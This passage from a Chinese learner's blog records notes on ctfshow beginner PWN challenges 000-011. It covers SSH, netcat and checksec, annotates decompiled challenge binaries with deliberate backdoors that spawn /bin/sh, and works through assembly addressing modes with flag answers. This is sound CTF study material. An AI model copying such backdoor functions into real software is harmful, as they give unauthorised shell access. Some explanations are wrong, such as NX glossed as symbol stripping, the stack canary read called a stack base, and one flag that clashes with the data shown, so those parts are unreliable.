  </entry>
  <entry>
    <title>【Pvvn】000-036知识点记录</title>
    <url>/2024/07/17/CS_Notes/PWN/%E3%80%90Pvvn%E3%80%91000-036%E7%9F%A5%E8%AF%86%E7%82%B9%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<ul>
<li>刚做完一遍，跟着vvp。基本流程是知道个七七八八了，这回重新把每道题看过去，提取一下知识点。为苯白痴量身制作的vvp白痴解释版思密达QwQ顺便复习（预习C语言</li>
</ul>
<p>vvp的链接：<a href="https://brocademaple.github.io/2024/07/16/CS_Notes/PWN/%5BPwn%5Dwp%E5%AD%98%E6%A1%A3/">【Puun】uup留档 | BROCADEMAPLE</a></p>
<h3 id="000-ssh连接的彩蛋题"><a class="header-anchor" href="#000-ssh连接的彩蛋题">¶</a>000 ssh连接的彩蛋题</h3>
<h4 id="什么是ssh连接"><a class="header-anchor" href="#什么是ssh连接">¶</a>什么是ssh连接</h4>
<ul>
<li>SSH（Secure Shell）是一种加密的网络协议，用于安全地访问远程计算机。</li>
<li>它提供了一个安全的渠道，允许用户在本地计算机上执行远程计算机上的命令，就像直接在远程计算机上操作一样。</li>
<li>SSH使用公钥加密技术来验证远程计算机和用户的身份，并为数据传输提供加密</li>
</ul>
<h4 id="什么是shell"><a class="header-anchor" href="#什么是shell">¶</a>什么是shell</h4>
<ol>
<li><strong>命令行界面</strong>：Shell是一个命令行界面（CLI），允许用户输入命令并接收输出结果。</li>
<li><strong>脚本执行</strong>：Shell可以执行脚本，这些脚本是一系列命令的集合，可以自动化任务。</li>
<li><strong>环境变量</strong>：Shell允许用户设置和使用环境变量，这些变量可以影响程序的行为。</li>
<li><strong>管道和重定向</strong>：Shell支持管道操作，可以将一个命令的输出作为另一个命令的输入。同时，Shell也支持输入输出的重定向。</li>
<li><strong>权限和安全</strong>：Shell执行的命令受到用户权限的限制。在安全方面，Shell需要正确配置以防止未授权访问。</li>
</ol>
<h4 id="在shell中输入id"><a class="header-anchor" href="#在shell中输入id">¶</a>在shell中输入id</h4>
<ul>
<li><code>id</code>命令用于显示当前用户的信息，包括用户ID（UID）、组ID（GID）以及其他所属的组。</li>
<li>在CTF赛题中，这可以帮助参赛者了解他们以哪个用户的身份登录，以及该用户具有哪些权限</li>
</ul>
<h4 id="ls-区别于ls的作用"><a class="header-anchor" href="#ls-区别于ls的作用">¶</a>ls /区别于ls的作用</h4>
<ul>
<li><code>ls</code>命令用于列出目录中的文件和子目录。不加任何参数时，默认列出当前目录的内容。</li>
<li><code>ls /</code>命令列出的是根目录（<code>/</code>）的内容。根目录是文件系统的最顶层目录，包含了所有其他目录和文件。这可以帮助参赛者了解服务器的文件系统结构。</li>
<li>通常，<code>ls</code>命令会列出<em><strong>当前工作目录</strong></em>的内容，而<code>ls /</code>则是列出<em><strong>根目录</strong></em>的内容，两者的区别在于它们指定的目录不同</li>
</ul>
<h3 id="001-nc连接-后门函数"><a class="header-anchor" href="#001-nc连接-后门函数">¶</a>001 nc连接+后门函数</h3>
<h4 id="什么是nc连接"><a class="header-anchor" href="#什么是nc连接">¶</a>什么是nc连接</h4>
<ul>
<li><code>nc</code>（Netcat）是一个用于网络工具，可以用于读写网络连接，使用TCP或UDP协议。它可以用来创建监听在特定端口的服务器，也可以用来发起连接到远程服务器的客户端。<code>nc</code>因其简单性和灵活性，在网络安全领域被广泛用于测试网络服务和进行端口扫描</li>
</ul>
<h4 id="nc连接和ssh连接的关联和区别"><a class="header-anchor" href="#nc连接和ssh连接的关联和区别">¶</a>nc连接和ssh连接的关联和区别</h4>
<ul>
<li><strong>关联</strong>：<code>nc</code>可以用来创建一个简单的SSH连接，例如，使用<code>nc</code>监听本地端口并转发到远程主机的SSH端口，实现端口转发。</li>
<li><strong>区别</strong>：
<ul>
<li><strong>协议</strong>：SSH是一种加密的网络协议，专为安全访问远程计算机而设计；而<code>nc</code>是一个更为通用的网络工具，不提供加密功能。</li>
<li><strong>安全性</strong>：SSH提供了加密和身份验证机制，确保数据传输的安全性；<code>nc</code>则不加密数据，容易受到中间人攻击。</li>
<li><strong>用途</strong>：SSH主要用于远程登录和命令执行，而<code>nc</code>可以用于更广泛的网络通信任务，如端口扫描、数据传输等。</li>
</ul>
</li>
</ul>
<h4 id="checksec"><a class="header-anchor" href="#checksec">¶</a>checksec</h4>
<ul>
<li><code>checksec</code>是一个用于分析程序二进制文件的安全特性的工具，它可以帮助user了解程序的内存保护机制，例如栈保护（<strong>Stack Canaries</strong>）、地址空间布局随机化（<strong>ASLR</strong>）、非执行栈（<strong>NoExecStack</strong>）、符号表剥离（<strong>NX</strong>）等。</li>
<li>在CTF的Pwn（二进制漏洞利用）方向中，了解这些安全特性对于找到漏洞和制定利用策略至关重要</li>
</ul>
<h4 id="system-“cat-ctfshow-flag”-是后门函数的原因"><a class="header-anchor" href="#system-“cat-ctfshow-flag”-是后门函数的原因">¶</a>system(“cat /ctfshow_flag”)是后门函数的原因</h4>
<ul>
<li><code>system</code>函数是C语言标准库中的一个函数，它允许调用shell命令。</li>
<li>如果一个程序中存在<code>system(&quot;cat /ctfshow_flag&quot;)</code>这样的代码，它实际上是在调用系统shell来执行<code>cat /ctfshow_flag</code>命令，这通常不是一个正常的程序行为，而是故意留下的后门</li>
</ul>
<h4 id="后门函数"><a class="header-anchor" href="#后门函数">¶</a>后门函数</h4>
<ul>
<li>
<p>后门函数是指在软件中故意或无意留下的代码，允许未经授权的用户绕过正常的认证和授权机制，获得对系统的访问权限或执行特定的操作。后门可以是一段代码、一个配置设置，或者是一个隐藏的接口。在CTF比赛中，找到并利用后门是获取Flag的一种常见策略。</p>
</li>
<li>
<p>在比赛中，参赛者需要利用程序的漏洞来执行任意代码，而后门函数如<code>system</code>可以被用来执行特定的命令，如读取Flag文件。</p>
</li>
<li>
<p>然而，使用后门函数通常需要找到一种方法来绕过程序的正常逻辑，这可能涉及到溢出、格式化字符串攻击等技术</p>
</li>
</ul>
<h4 id="在本地写入一个flag文件作为测试"><a class="header-anchor" href="#在本地写入一个flag文件作为测试">¶</a>在本地写入一个flag文件作为测试</h4>
<p><code>echo &quot;flag&#123;just_test_my_process! &#125;&quot;&gt;/c|t|f|s|h|o|w_flag</code></p>
<p>然后运行pvvn程序，可以得到本地写入的flag值</p>
<p>后面的题中，在连接远程环境之前，可以先本地运行pvvn文件，测试能否得到这个flag值</p>
<h3 id="002-shell-分析c代码"><a class="header-anchor" href="#002-shell-分析c代码">¶</a>002 shell+分析c代码</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn002/pwn&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>64位程序，仅关闭canary</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span> &#123;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  logo();  <span class="comment">// 显示logo</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; Now, you can use &#x27;cat /ctfshow_flag&#x27; to get flag! &quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;/bin/sh&quot;</span>);  <span class="comment">// 后门函数，给了一个shell</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 这段代码设计了一个程序，启动时会调整一些I/O缓冲设置，展示一个欢迎信息，并最终提供一个交互式shell，暗示用户可以通过特定命令获取某个“flag”</span></span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls -l /bin/sh</span><br><span class="line">... -&gt; dash  // </span><br></pre></td></tr></table></figure>
<h4 id="setvbuf调用"><a class="header-anchor" href="#setvbuf调用">¶</a>setvbuf调用</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setvbuf(_bss_start, 0LL, 2, 0LL);</span><br><span class="line">setvbuf(stdin, 0LL, 2, 0LL);</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p><code>setvbuf</code>函数用于控制缓冲区行为。这里进行了两次调用，分别针对<code>_bss_start</code>和标准输入<code>stdin</code>。</p>
</li>
<li>
<p><code>_bss_start</code>通常指向未初始化数据段的开始，这里的调用可能意在对程序的BSS段（存放未初始化全局变量和静态变量的部分）进行缓冲区设置。但是，传入的参数（尤其是第二个参数为NULL和第三个参数为2）表明它试图禁用缓冲或使用无缓冲I/O。实际上，直接对_BSS_START进行这样的操作不太常见且可能不正确，因为_BSS_START不是一个标准的文件流。</p>
</li>
<li>
<p>对于<code>stdin</code>的<code>setvbuf</code>调用，它设置了标准输入流为无缓冲I/O（模式2），这意味着从标准输入读取数据时将直接进行，没有缓冲延迟，这对于交互式shell尤其重要。</p>
</li>
</ul>
<h4 id="system-“-bin-sh”-的工作原理"><a class="header-anchor" href="#system-“-bin-sh”-的工作原理">¶</a>system(“/bin/sh”)的工作原理</h4>
<ul>
<li>system()函数先fork一个子进程，在这个子进程中调用/bin/sh -c来执行command指定的命令。</li>
<li>/bin/sh在系统中一般是个软链接，指向dash或者bash等常用的shell，-c选项是告诉shell从字符串</li>
<li>command中读取要执行的命令（shell将扩展command中的任何特殊字符）。父进程则调用waitpid()函数来为变成僵尸的子进程收尸，获得其结束状态，然后将这个结束状态返回给system()函数的调用者</li>
<li>执行完这个后它就会返回一个shell给函数的调用者</li>
<li>system(“cat /ctfshow_flag”);  system(“/bin/sh”);这一类的我们称之为后门函数，再后续利用过程中我们要尽可能找到或者构造出来</li>
</ul>
<h3 id="003-真假命令（一）"><a class="header-anchor" href="#003-真假命令（一）">¶</a>003 真假命令（一）</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[*] level up ! Let&#x27;s go ! </span><br><span class="line">You can call the following function:</span><br><span class="line">1._start</span><br><span class="line">2.main</span><br><span class="line">3.hello_ctfshow</span><br><span class="line">4.ctfshow(&#x27;echo /ctfshow_flag&#x27;)</span><br><span class="line">5.print(&#x27;/ctfshow_flag&#x27;)</span><br><span class="line">6.system(&#x27;cat /ctfshow_flag&#x27;)</span><br><span class="line">7.puts(&#x27;/ctfshow_flag&#x27;)</span><br><span class="line">8.exit</span><br><span class="line">Your choice is :</span><br></pre></td></tr></table></figure>
<p>看起来是这样的，看起来选6，但是真的假的还是得看源代码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn003/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">64位程序保护全开</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 变量定义</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> **v3; <span class="comment">// rdx   指针变量v3</span></span><br><span class="line">  <span class="type">char</span> argva[<span class="number">12</span>]; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF  12位的字符数组</span></span><br><span class="line"></span><br><span class="line">  *(_QWORD *)&amp;argva[<span class="number">4</span>] = __readfsqword(<span class="number">0x28</span>u);  <span class="comment">// 这行代码读取了线程信息块(TIB)中的某个地址（通常是栈基址），并将该值存储到argva数组的某个位置</span></span><br><span class="line">  </span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);  <span class="comment">// 调用了setvbuf来改变缓冲区行为，与之前的代码一致，分别为_BSS段和标准输入stdin设置无缓冲I/O</span></span><br><span class="line">   </span><br><span class="line">    </span><br><span class="line">  logo();  <span class="comment">// 美术部分</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*] level up ! Let&#x27;s go ! &quot;</span>);</span><br><span class="line">  menu();  <span class="comment">// 就是上面的选项列表</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Your choice is :\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, argva);  <span class="comment">// 使用__isoc99_scanf函数从标准输入读取一个整数到argva数组中，作为用户的选择</span></span><br><span class="line">  <span class="keyword">switch</span> ( *(_DWORD *)argva )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;start&quot;</span>);  <span class="comment">// 一眼假</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      main((<span class="type">int</span>)<span class="string">&quot;%d&quot;</span>, (<span class="type">const</span> <span class="type">char</span> **)argva, v3);  <span class="comment">// ai说是递归调用main函数</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Hello CTFshow&quot;</span>);    <span class="comment">// 一眼假</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      ctfshow();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;/ctfshow_flag&quot;</span>);    <span class="comment">// 一眼假</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">      system_func();  <span class="comment">// 看看这个函数有没有执行</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag&quot;</span>);    <span class="comment">// 一眼假</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);    <span class="comment">// 一眼假</span></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid input&quot;</span>);    <span class="comment">// 一眼假</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"> <span class="type">int</span> <span class="title function_">system_func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;cat /ctfshow_flag&quot;</span>);</span><br><span class="line">&#125;  <span class="comment">// 看来确实执行了</span></span><br><span class="line"></span><br><span class="line"> <span class="type">int</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo /ctfshow_flag&quot;</span>);</span><br><span class="line">&#125;  <span class="comment">// 执行了，但是只有打印，一眼假</span></span><br></pre></td></tr></table></figure>
<h3 id="004-看C代码"><a class="header-anchor" href="#004-看C代码">¶</a>004 看C代码</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn004/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">64位保护全开</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 变量定义</span></span><br><span class="line">  <span class="type">char</span> s1[<span class="number">11</span>]; <span class="comment">// [rsp+1h] [rbp-1Fh] BYREF  // 用于存储字符串&quot;CTFshowPWN&quot;</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">12</span>]; <span class="comment">// [rsp+Ch] [rbp-14h] BYREF  // 用于接收用户输入</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-8h]  // 用于存储从FS段读取的信息，可能与栈保护或调试相关</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);  <span class="comment">// 读取FS段寄存器的值</span></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);  </span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);  <span class="comment">// 通过两次setvbuf调用，禁用了_BSS段和标准输入stdin的缓冲</span></span><br><span class="line">  <span class="built_in">strcpy</span>(s1, <span class="string">&quot;CTFshowPWN&quot;</span>);  <span class="comment">// 字符串&quot;CTFshowPWN&quot;复制到s1数组</span></span><br><span class="line">  logo();  <span class="comment">// 美术</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;find the secret !&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, s2);  <span class="comment">// 通过scanf函数等待用户输入一个字符串，并将其保存到s2数组中。注意，直接使用%s格式化字符串而不指定最大长度可能会导致缓冲区溢出的安全风险</span></span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, s2) )</span><br><span class="line">    execve_func();  <span class="comment">// s1 s2相同就执行</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">execve_func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *argv[<span class="number">3</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF  读取了线程信息块中的某个值，可能用于检测堆栈是否被修改，确保安全</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]  // 用于存储FS段的原始值，可能用于安全检查或调试</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);  <span class="comment">// 读取了线程信息块中的某个值，可能用于检测堆栈是否被修改，确保安全</span></span><br><span class="line">  argv[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>;  <span class="comment">// shell自身的名称</span></span><br><span class="line">  argv[<span class="number">1</span>] = <span class="number">0LL</span>;  <span class="comment">// 参数结束标志</span></span><br><span class="line">  argv[<span class="number">2</span>] = <span class="number">0LL</span>; <span class="comment">// 多余的，因为在argv[1]后已经结束</span></span><br><span class="line">  execve(<span class="string">&quot;/bin/sh&quot;</span>, argv, <span class="number">0LL</span>);  <span class="comment">// 使用execve系统调用来启动一个新的程序，替换当前进程的内存空间。在这里，它启动的是Shell (/bin/sh)，并且传入了预先准备好的参数列表argv。第三个参数为0LL，意味着环境变量列表为空</span></span><br><span class="line"> <span class="comment">// 第一个参数是指向可执行文件路径的字符串，指向Shell程序</span></span><br><span class="line"> <span class="comment">// 第三个参数0LL，即(char*)NULL，意味着不传递任何环境变量给新进程</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p><code>execve</code> 本身并不是一个后门函数。实际上， <code>execve</code> 是一个标准的系统调用函数，用于在 Linux和类 Unix 系统中执行一个新的程序。它的原型如下：<br>
<code>int execve(const char *filename, char *const argv[], char *const envp[]);</code><br>
该函数接受三个参数：</p>
<ul>
<li>filename ：要执行的程序的文件名或路径。</li>
<li>argv ：一个以 NULL 结尾的字符串数组，表示传递给新程序的命令行参数。</li>
<li>envp ：一个以 NULL 结尾的字符串数组，表示新程序的环境变量。</li>
<li>当调用 execve 函数时，它会将当前进程替换为新程序的代码，并开始执行新程序。新程序接收argv 和 envp 作为命令行参数和环境变量。</li>
<li>在加入某些参数后就可以达到我们所需要的后门函数的效果</li>
</ul>
</li>
<li>
<p>这道题就是输入<code>CTFshowPWN</code>字符串，即可获得shell，然后<code>cat /ctfshow_flag</code></p>
</li>
</ul>
<h3 id="005-012-了解寄存器、寻址方式’"><a class="header-anchor" href="#005-012-了解寄存器、寻址方式’">¶</a>005-012  了解寄存器、寻址方式’</h3>
<h4 id="汇编代码"><a class="header-anchor" href="#汇编代码">¶</a>汇编代码</h4>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">section .data</span><br><span class="line">	msg db &quot;Welcome_to_CTFshow_PWN&quot;, 0</span><br><span class="line">section .text</span><br><span class="line">	global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line">; 立即寻址方式</span><br><span class="line">    mov eax, 11 ; 将11赋值给eax</span><br><span class="line">    add eax, 114504 ; eax加上114504</span><br><span class="line">    sub eax, 1 ; eax减去1</span><br><span class="line">; 寄存器寻址方式</span><br><span class="line">    mov ebx, 0x36d ; 将0x36d赋值给ebx</span><br><span class="line">    mov edx, ebx ; 将ebx的值赋值给edx</span><br><span class="line">; 直接寻址方式</span><br><span class="line">    mov ecx, [msg] ; 将msg的地址赋值给ecx	</span><br><span class="line">; 寄存器间接寻址方式</span><br><span class="line">    mov esi, msg ; 将msg的地址赋值给esi</span><br><span class="line">    mov eax, [esi] ; 将esi所指向的地址的值赋值给eax</span><br><span class="line">; 寄存器相对寻址方式</span><br><span class="line">    mov ecx, msg ; 将msg的地址赋值给ecx</span><br><span class="line">    add ecx, 4 ; 将ecx加上4</span><br><span class="line">    mov eax, [ecx] ; 将ecx所指向的地址的值赋值给eax</span><br><span class="line">; 基址变址寻址方式</span><br><span class="line">    mov ecx, msg ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 2 ; 将2赋值给edx</span><br><span class="line">    mov eax, [ecx + edx*2] ; 将ecx+edx*2所指向的地址的值赋值给eax</span><br><span class="line">; 相对基址变址寻址方式</span><br><span class="line">    mov ecx, msg ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 1 ; 将1赋值给edx</span><br><span class="line">    add ecx, 8 ; 将ecx加上8</span><br><span class="line">    mov eax, [ecx + edx*2 - 6] ; 将ecx+edx*2-6所指向的地址的值赋值给eax</span><br><span class="line">; 输出字符串</span><br><span class="line">    mov eax, 4 ; 系统调用号4代表输出字符串</span><br><span class="line">    mov ebx, 1 ; 文件描述符1代表标准输出</span><br><span class="line">    mov ecx, msg ; 要输出的字符串的地址</span><br><span class="line">    mov edx, 22 ; 要输出的字符串的长度</span><br><span class="line">    int 0x80 ; 调用系统调用</span><br><span class="line">; 退出程序</span><br><span class="line">    mov eax, 1 ; 系统调用号1代表退出程序</span><br><span class="line">    xor ebx, ebx ; 返回值为0</span><br><span class="line">    int 0x80 ; 调用系统调用</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>使用NASM汇编器和ld链接器将汇编代码编译成可执行文件</p>
</li>
<li>
<p>首先，将代码保存为一个文件，例如 Welcome_CTFshow.asm 。然后，使用以下命令将其编译为对象文件↓↓↓</p>
</li>
<li>
<p><code>nasm -f elf Welcome_to_CTFshow.asm</code></p>
<ul>
<li>这将生成一个名为 <code>Welcome_CTFshow.o</code> 的对象文件。接下来，使用以下命令将对象文件链接成可执行文件</li>
<li><code>ld -m elf_i386 -s -o Welcome_to_CTFshow Welcome_to_CTFshow.o</code>
<ul>
<li>这将生成一个名为 Welcome_CTFshow 的可执行文件</li>
</ul>
</li>
</ul>
</li>
<li>
<p>用64位IDA打开<code>Welcome_to_CTFshow.o</code>，即可获得以上汇编代码</p>
</li>
<li>
<p>好抽象啊啊啊啊啊啊啊啊啊啊</p>
</li>
</ul>
<h4 id="005-运行可执行文件"><a class="header-anchor" href="#005-运行可执行文件">¶</a>005  运行可执行文件</h4>
<p><code>./Welcome_to_CTFshow</code></p>
<p>得到：<code>Welcome_to_CTFshow_PWN</code></p>
<ul>
<li><code>ctfshow&#123;Welcome_to_CTFshow_PWN&#125;</code></li>
</ul>
<h4 id="006-立即寻址方式"><a class="header-anchor" href="#006-立即寻址方式">¶</a>006  立即寻址方式</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 立即寻址方式</span><br><span class="line">    mov eax, 11 ; 将11赋值给eax</span><br><span class="line">    add eax, 114504 ; eax加上114504</span><br><span class="line">    sub eax, 1 ; eax减去1</span><br></pre></td></tr></table></figure>
<ul>
<li><code>ctfshow&#123;114514&#125;</code>  （好臭啊</li>
</ul>
<h4 id="007-寄存器寻址方式"><a class="header-anchor" href="#007-寄存器寻址方式">¶</a>007  寄存器寻址方式</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 寄存器寻址方式</span><br><span class="line">    mov ebx, 0x36d ; 将0x36d赋值给ebx</span><br><span class="line">    mov edx, ebx ; 将ebx的值赋值给edx</span><br></pre></td></tr></table></figure>
<ul>
<li><code>ctfshow&#123;0x36D&#125;</code></li>
</ul>
<h4 id="008-直接寻址方式"><a class="header-anchor" href="#008-直接寻址方式">¶</a>008  直接寻址方式</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 直接寻址方式</span><br><span class="line">	mov ecx, [msg] ; 将msg的地址赋值给ecx</span><br><span class="line">对应IDA：</span><br><span class="line">	mov ecx, dword_80490E8</span><br></pre></td></tr></table></figure>
<ul>
<li><code>ctfshow&#123;0x80490E8&#125;</code></li>
</ul>
<h4 id="009-寄存器间接寻址方式"><a class="header-anchor" href="#009-寄存器间接寻址方式">¶</a>009  寄存器间接寻址方式</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 寄存器间接寻址方式</span><br><span class="line">    mov esi, msg ; 将msg的地址赋值给esi</span><br><span class="line">    mov eax, [esi] ; 将esi所指向的地址的值赋值给eax</span><br><span class="line">对应IDA：</span><br><span class="line">	mov esi, offset dword_80490E8</span><br><span class="line">	mov eax, [esi]</span><br><span class="line"></span><br><span class="line">.data:080490E8 dword_80490E8 dd 696C6557h		; DATA XREF: LOAD:0804805C↑o</span><br></pre></td></tr></table></figure>
<ul>
<li><code>ctfshow&#123;0x636C6557&#125;</code></li>
</ul>
<h4 id="010-寄存器相对寻址方式"><a class="header-anchor" href="#010-寄存器相对寻址方式">¶</a>010  寄存器相对寻址方式</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 寄存器相对寻址方式</span><br><span class="line">    mov ecx, msg ; 将msg的地址赋值给ecx</span><br><span class="line">    add ecx, 4 ; 将ecx加上4</span><br><span class="line">    mov eax, [ecx] ; 将ecx所指向的地址的值赋值给eax</span><br><span class="line">对应IDA：</span><br><span class="line">	mov ecx, offset dword_80490E8</span><br><span class="line">	add ecx, 4</span><br><span class="line">	mov eax, [ecx]</span><br><span class="line">	</span><br><span class="line">.data:080490E8 dword_80490E8 dd 696C6557h		; DATA XREF: LOAD:0804805C↑o</span><br><span class="line">.data:080490EC aOmeToCtfshowPw db &#x27;ome_to_CTFshow_PWN&#x27;, 0</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>这里将msg的地址（0x80490E8）+ 4 处所执向的地址的值赋给eax</p>
</li>
<li>
<p><code>hex(0x80490E8+4)</code>    得到<code>0x80490ec</code>   也就是<code>“ome_to_CTFshow_PWN”</code></p>
</li>
<li>
<p><code>ctfshow&#123;ome_to_CTFshow_PWN&#125;</code></p>
</li>
</ul>
<h4 id="011-基址变址寻址方式"><a class="header-anchor" href="#011-基址变址寻址方式">¶</a>011  基址变址寻址方式</h4>
